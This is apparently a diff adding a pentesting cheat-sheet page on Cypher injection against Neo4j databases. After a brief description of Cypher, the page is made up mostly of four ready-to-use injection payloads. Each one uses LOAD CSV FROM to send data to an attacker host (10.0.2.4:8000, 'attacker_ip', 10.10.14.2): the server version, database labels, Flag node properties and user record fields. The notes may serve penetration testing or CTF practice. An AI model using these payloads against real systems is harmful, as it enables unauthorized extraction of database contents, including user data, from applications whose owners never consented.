@@ -1,0 +1,36 @@
+---
+title: Cypher injection
+source_url: https://notes.incendium.rocks/pentesting-notes/web/injection/cypher-injection
+fetched_at: 2026-09-20T01:23:21Z
+license: unspecified
+category: web
+---
+***
+
+Cypher is Neo4j's graph query language that lets you retrieve data from the graph. It uses “an ASCII-art type of syntax,” in which rounded brackets are used to represent nodes and square brackets represent relationships. If that sounds familiar, it's inspired by SQL (according to Neo4j).
+
+## Injection
+
+### Server version:
+
+```sql
+' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
+```
+
+### Labels (like columns)
+
+```sql
+'}) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://attacker_ip /?l='+label as l RETURN 0 as _0
+```
+
+### Get information from labels (data)
+
+```sql
+' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM 'http://10.0.2.4:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+```
+
+#### With WHERE clause:
+
+```sql
+' OR 1=1 WITH 1 as a MATCH (u:user) WHERE u.id=1 UNWIND keys(u) as p LOAD CSV FROM 'http://10.10.14.2/?' + p +'='+toString(u[p]) as l RETURN 0 as _0 //
+```
